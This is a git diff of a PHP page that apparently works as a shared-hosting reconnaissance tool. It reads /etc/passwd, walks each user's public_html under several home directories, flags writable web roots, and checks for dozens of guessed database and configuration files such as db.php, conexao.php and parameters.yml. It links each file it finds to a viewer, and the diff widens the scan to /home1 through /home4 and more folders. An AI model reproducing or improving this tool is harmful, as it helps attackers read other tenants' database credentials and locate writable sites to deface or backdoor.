@@ -52,138 +52,144 @@ if(isset($_GET['pathfile'])&&!empty($_GET['pathfile'])){
 <?php
 
 if(@file('/etc/passwd')){
-    $users = file('/etc/passwd');
+$users = file('/etc/passwd');
 
-    ?>
-    <table id="table" class="display" cellspacing="0" width="100%">
-        <thead>
-            <tr>
-                <th>
-                    id
-                </th>
-                <th>
-                    user
-                </th>
-                <th>
-                    index.php
-                </th>
-                <th>
-                    public writter
-                </th>
-                <th>
-                    Default
-                </th>
-                <th>
-                    Drupal 6
-                </th>
-                <th>
-                    Drupal 7
-                </th>
-                <th>
-                    write joom up
-                </th>
-                <th>
-                    write wp up
-                </th>
-                <th>
-                    conf
-                </th>
-                <th>
-                    vb
-                </th>
-                <th>
-                    joo
-                </th>
-                <th>
-                    wp
-                </th>
-                <th>
-                    laravel
-                </th>
-                <th>
-                    codeigniter
-                </th>
-                <th>
-                    symfony
-                </th>
-                <th>
-                    zend
-                </th>
-                <th>
-                    htaccess
-                </th>
-                <th>
-                    php.ini
-                </th>
-            </tr>
-        </thead>
-        <tfoot>
-        <tr>
-            <th>
-                id
-            </th>
-            <th>
-                user
-            </th>
-            <th>
-                public writter
-            </th>
-            <th>
-                index.php
-            </th>
-            <th>
-                Default
-            </th>
-            <th>
-                Drupal 6
-            </th>
-            <th>
-                Drupal 7
-            </th>
-            <th>
-                write joom up
-            </th>
-            <th>
-                write wp up
-            </th>
-            <th>
-                conf
-            </th>
-            <th>
-                vb
-            </th>
-            <th>
-                joo
-            </th>
-            <th>
-                wp
-            </th>
-            <th>
-                laravel
-            </th>
-            <th>
-                codeigniter
-            </th>
-            <th>
-                symfony
-            </th>
-            <th>
-                zend
-            </th>
-            <th>
-                htaccess
-            </th>
-            <th>
-                php.ini
-            </th>
-        </tr>
-        </tfoot>
-        <tbody align="center">
+?>
+<table id="table" class="display" cellspacing="0" width="100%">
+    <thead>
+    <tr>
+        <th>
+            id
+        </th>
+        <th>
+            user
+        </th>
+        <th>
+            index.php
+        </th>
+        <th>
+            public writter
+        </th>
+        <th>
+            Default
+        </th>
+        <th>
+            Drupal 6
+        </th>
+        <th>
+            Drupal 7
+        </th>
+        <th>
+            write joom up
+        </th>
+        <th>
+            write wp up
+        </th>
+        <th>
+            conf
+        </th>
+        <th>
+            vb
+        </th>
+        <th>
+            joo
+        </th>
+        <th>
+            wp
+        </th>
+        <th>
+            laravel
+        </th>
+        <th>
+            codeigniter
+        </th>
+        <th>
+            symfony
+        </th>
+        <th>
+            zend
+        </th>
+        <th>
+            htaccess
+        </th>
+        <th>
+            php.ini
+        </th>
+    </tr>
+    </thead>
+    <tfoot>
+    <tr>
+        <th>
+            id
+        </th>
+        <th>
+            user
+        </th>
+        <th>
+            public writter
+        </th>
+        <th>
+            index.php
+        </th>
+        <th>
+            Default
+        </th>
+        <th>
+            Drupal 6
+        </th>
+        <th>
+            Drupal 7
+        </th>
+        <th>
+            write joom up
+        </th>
+        <th>
+            write wp up
+        </th>
+        <th>
+            conf
+        </th>
+        <th>
+            vb
+        </th>
+        <th>
+            joo
+        </th>
+        <th>
+            wp
+        </th>
+        <th>
+            laravel
+        </th>
+        <th>
+            codeigniter
+        </th>
+        <th>
+            symfony
+        </th>
+        <th>
+            zend
+        </th>
+        <th>
+            htaccess
+        </th>
+        <th>
+            php.ini
+        </th>
+    </tr>
+    </tfoot>
+    <tbody align="center">
     <?php
-    foreach($users as $key=> $user) {
+    $homes[]="home";
+    $homes[]="home1";
+    $homes[]="home2";
+    $homes[]="home3";
+    $homes[]="home4";
+    foreach($homes as $keyHome=>$home) {
+        foreach($users as $key=> $user) {
 
         $user = explode(':', $user);
-        if (is_dir("/home/" . $user[0] . "/public_html/")) {
+        if (is_dir('/'.$home.'/' . $user[0] . "/public_html/")) {
             ?>
 
             <tr>
@@ -195,7 +201,7 @@ if(@file('/etc/passwd')){
                 </td>
                 <td>
                     <?php
-                    $pathindex = '/home/' . $user[0] . '/public_html/index.php';
+                    $pathindex = '/'.$home.'/' . $user[0] . '/public_html/index.php';
                     if (file_exists($pathindex)) {
                         ?>
                         <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathindex; ?>"  href="#">
@@ -207,7 +213,7 @@ if(@file('/etc/passwd')){
                 </td>
                 <td>
                     <?php
-                    $pathpublicwritter = '/home/' . $user[0] . '/public_html/';
+                    $pathpublicwritter = '/'.$home.'/' . $user[0] . '/public_html/';
                     if (is_writable($pathpublicwritter)) {
                         ?>
                         <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $pathpublicwritter; ?>"  href="#">
@@ -219,61 +225,48 @@ if(@file('/etc/passwd')){
                 </td>
                 <td>
                     <?php
-                        $url = array();
-                        $url[]='/home/' . $user[0] . '/public_html/database.php';
-                        $url[]='/home/' . $user[0] . '/public_html/conexao.php';
-                        $url[]='/home/' . $user[0] . '/public_html/connection.php';
-                        $url[]='/home/' . $user[0] . '/public_html/conectar.php';
-                        $url[]='/home/' . $user[0] . '/public_html/conecta.php';
-                        $url[]='/home/' . $user[0] . '/public_html/db.php';
-                        $url[]='/home/' . $user[0] . '/public_html/bd.php';
-                        $url[]='/home/' . $user[0] . '/public_html/con.php';
-                        $url[]='/home/' . $user[0] . '/public_html/conn.php';
-                        $url[]='/home/' . $user[0] . '/public_html/includes/database.php';
-                        $url[]='/home/' . $user[0] . '/public_html/includes/conexao.php';
-                        $url[]='/home/' . $user[0] . '/public_html/includes/connection.php';
-                        $url[]='/home/' . $user[0] . '/public_html/includes/conectar.php';
-                        $url[]='/home/' . $user[0] . '/public_html/includes/conecta.php';
-                        $url[]='/home/' . $user[0] . '/public_html/includes/db.php';
-                        $url[]='/home/' . $user[0] . '/public_html/includes/bd.php';
-                        $url[]='/home/' . $user[0] . '/public_html/includes/con.php';
-                        $url[]='/home/' . $user[0] . '/public_html/includes/conn.php';
-                        $url[]='/home/' . $user[0] . '/public_html/includes/configuration.php';
-                        $url[]='/home/' . $user[0] . '/public_html/includes/configuracao.php';
-                        $url[]='/home/' . $user[0] . '/public_html/include/database.php';
-                        $url[]='/home/' . $user[0] . '/public_html/include/conexao.php';
-                        $url[]='/home/' . $user[0] . '/public_html/include/connection.php';
-                        $url[]='/home/' . $user[0] . '/public_html/include/conectar.php';
-                        $url[]='/home/' . $user[0] . '/public_html/include/conecta.php';
-                        $url[]='/home/' . $user[0] . '/public_html/include/db.php';
-                        $url[]='/home/' . $user[0] . '/public_html/include/bd.php';
-                        $url[]='/home/' . $user[0] . '/public_html/include/con.php';
-                        $url[]='/home/' . $user[0] . '/public_html/include/conn.php';
-                        $url[]='/home/' . $user[0] . '/public_html/include/configuration.php';
-                        $url[]='/home/' . $user[0] . '/public_html/include/configuracao.php';
-                        $url[]='/home/' . $user[0] . '/public_html/config/database.php';
-                        $url[]='/home/' . $user[0] . '/public_html/config/conexao.php';
-                        $url[]='/home/' . $user[0] . '/public_html/config/connection.php';
-                        $url[]='/home/' . $user[0] . '/public_html/config/conectar.php';
-                        $url[]='/home/' . $user[0] . '/public_html/config/conecta.php';
-                        $url[]='/home/' . $user[0] . '/public_html/config/db.php';
-                        $url[]='/home/' . $user[0] . '/public_html/config/bd.php';
-                        $url[]='/home/' . $user[0] . '/public_html/config/con.php';
-                        $url[]='/home/' . $user[0] . '/public_html/config/conn.php';
-                        $url[]='/home/' . $user[0] . '/public_html/config/configuration.php';
-                        $url[]='/home/' . $user[0] . '/public_html/config/configuracao.php';
-                        $url[]='/home/' . $user[0] . '/public_html/app/config/database.yml';
-                        $url[]='/home/' . $user[0] . '/public_html/app/config/config.yml';
-                        $url[]='/home/' . $user[0] . '/public_html/app/config/parameters.yml';
-                        foreach($url as $u){
-                            if (file_exists($u)) {
-                                ?>
-                                <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $u; ?>" href="#">
-                                    &#10004;
-                                </a>
-                                <?php
-                            }
+                    unset($url);
+
+                    $url = array();
+                    $folderDefaults = array();
+                    $folderDefaults[]="";
+                    $folderDefaults[]="includes/";
+                    $folderDefaults[]="include/";
+                    $folderDefaults[]="config/";
+                    $folderDefaults[]="common/";
+                    $folderDefaults[]="site/";
+                    foreach($folderDefaults as $keyFolder=>$folderDefault){
+                        if($keyFolder!=0){
+                            $url[]='/'.$home.'/' . $user[0] . '/public_html/'.$folderDefault.'configuration.php';
                         }
+                        $url[]='/'.$home.'/' . $user[0] . '/public_html/'.$folderDefault.'database.php';
+                        $url[]='/'.$home.'/' . $user[0] . '/public_html/'.$folderDefault.'conexao.php';
+                        $url[]='/'.$home.'/' . $user[0] . '/public_html/'.$folderDefault.'connection.php';
+                        $url[]='/'.$home.'/' . $user[0] . '/public_html/'.$folderDefault.'conectar.php';
+                        $url[]='/'.$home.'/' . $user[0] . '/public_html/'.$folderDefault.'conecta.php';
+                        $url[]='/'.$home.'/' . $user[0] . '/public_html/'.$folderDefault.'db.php';
+                        $url[]='/'.$home.'/' . $user[0] . '/public_html/'.$folderDefault.'bd.php';
+                        $url[]='/'.$home.'/' . $user[0] . '/public_html/'.$folderDefault.'con.php';
+                        $url[]='/'.$home.'/' . $user[0] . '/public_html/'.$folderDefault.'conn.php';
+                        $url[]='/'.$home.'/' . $user[0] . '/public_html/'.$folderDefault.'configuracao.php';
+                    }
+
+                    $url[]='/'.$home.'/' . $user[0] . '/public_html/app/config/database.yml';
+                    $url[]='/'.$home.'/' . $user[0] . '/public_html/app/config/config.yml';
+                    $url[]='/'.$home.'/' . $user[0] . '/public_html/app/config/parameters.yml';
+
+                    foreach($url as $u){
+
+                        if (file_exists($u)) {
+
+
+                            ?>
+                            <a id="teste" class="btn btn-info modalasz" data-path="<?php echo $u; ?>" href="#">
+                                &#10004;
+                            </a>
+                            <?php
+                        }
+                    }
 
                     ?>
                 </td>
@@ -471,17 +464,19 @@ if(@file('/etc/passwd')){
 
             <?php
         }
-    }?>
-        </tbody>
+    }
+    }
+    ?>
+    </tbody>
     <?php
-}
+    }
     ?>
 
-    </table>
-    <!-- Modal -->
-    <div id="myModal" role="dialog">
+</table>
+<!-- Modal -->
+<div id="myModal" role="dialog">
 
-    </div>
+</div>
 
 </body>
 </html>
